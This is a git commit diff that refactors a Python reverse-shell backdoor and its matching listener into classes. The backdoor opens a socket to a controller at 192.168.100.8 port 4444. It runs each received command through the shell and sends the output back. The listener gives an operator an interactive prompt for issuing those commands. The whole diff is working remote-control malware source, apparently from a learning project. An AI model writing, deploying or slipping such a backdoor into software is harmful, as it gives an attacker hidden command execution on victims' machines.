782dc8ffd9b0057ff8e86c06b9aa165523256674
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-25 11:53:35 +0700

    Connection with remote computer + executing commands

--- backdoor.py
+++ backdoor.py
@@ -2,21 +2,26 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.connection.recv(1024)
+            c = str(command)
+            a = c.replace(c[0], "")
+            s = a.replace(a[0], "")
+            # print(s)
+            command_result = self.execute_system_command(str(s))
+            self.connection.send(command_result)
+
+        connection.close()
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.100.3", 4444))
-
-
-while True:
-    command = connection.recv(1024)
-    c = str(command)
-    a = c.replace(c[0], "")
-    s = a.replace(a[0], "")
-    # print(s)
-    command_result = execute_system_command(str(s))
-    connection.send(command_result)
-
-connection.close()
+my_backdoor = Backdoor("192.168.100.8", 4444)
+my_backdoor.run()
--- listener.py
+++ listener.py
@@ -1,15 +1,26 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("192.168.100.3", 4444))
-listener.listen(0)
-print("[+] Waiting for incoming connections...")
-connection, address = listener.accept()
-print("[+] Got a connection from " + str(address))
 
-while True:
-    command = input(">> ")
-    connection.send(bytes(command, encoding='utf8'))
-    result = connection.recv(1024)
-    print(result.decode('cp866'))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connections...")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def execute_remotely(self, command):
+        self.connection.send(bytes(command, encoding='utf8'))
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result.decode('cp866'))
+
+
+my_listener = Listener("192.168.100.8", 4444)
+my_listener.run()
